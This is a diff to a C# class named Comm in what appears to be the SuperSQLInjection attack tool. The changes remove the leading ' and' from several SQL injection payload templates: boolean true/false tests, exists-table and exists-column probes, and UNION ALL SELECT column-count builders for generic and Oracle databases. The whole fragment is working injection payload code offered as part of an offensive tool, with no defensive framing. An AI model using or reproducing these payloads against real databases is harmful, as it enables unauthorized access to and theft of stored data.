@@ -6,10 +6,10 @@ namespace SuperSQLInjection.payload
 {
     class Comm
     {
-        public static String exists_table = " and exists(select 1 from {0})";
-        public static String exists_column = " and exists(select {0} from {1})";
-        public static String truePayload = " and 1=1";
-        public static String falsePayload = " and 1=2";
+        public static String exists_table = " exists(select 1 from {0})";
+        public static String exists_column = " exists(select {0} from {1})";
+        public static String truePayload = " 1=1";
+        public static String falsePayload = " 1=2";
 
         public static String unionColumns(List<String> columns, String unionStr)
         {
@@ -26,7 +26,7 @@ namespace SuperSQLInjection.payload
 
         public static String unionColumnCountTest(int maxColumn,String fill)
         {
-            StringBuilder sb = new StringBuilder(" and 1=2 union all select ");
+            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
             for (int i = 1; i <= maxColumn;i++ )
             {
                 sb.Append(fill+"+"+i+",");
@@ -37,7 +37,7 @@ namespace SuperSQLInjection.payload
 
         public static String unionColumnCountTestByOracle(int maxColumn, String fill)
         {
-            StringBuilder sb = new StringBuilder(" and 1=2 union all select ");
+            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
             for (int i = 1; i <= maxColumn; i++)
             {
                 sb.Append(fill + ",");
@@ -48,7 +48,7 @@ namespace SuperSQLInjection.payload
 
         public static String unionColumnCountTestByOracle(int maxColumn,int testIndex,String fill)
         {
-            StringBuilder sb = new StringBuilder(" and 1=2 union all select ");
+            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
             for (int i = 1; i <= maxColumn; i++)
             {
                 if (i == testIndex)
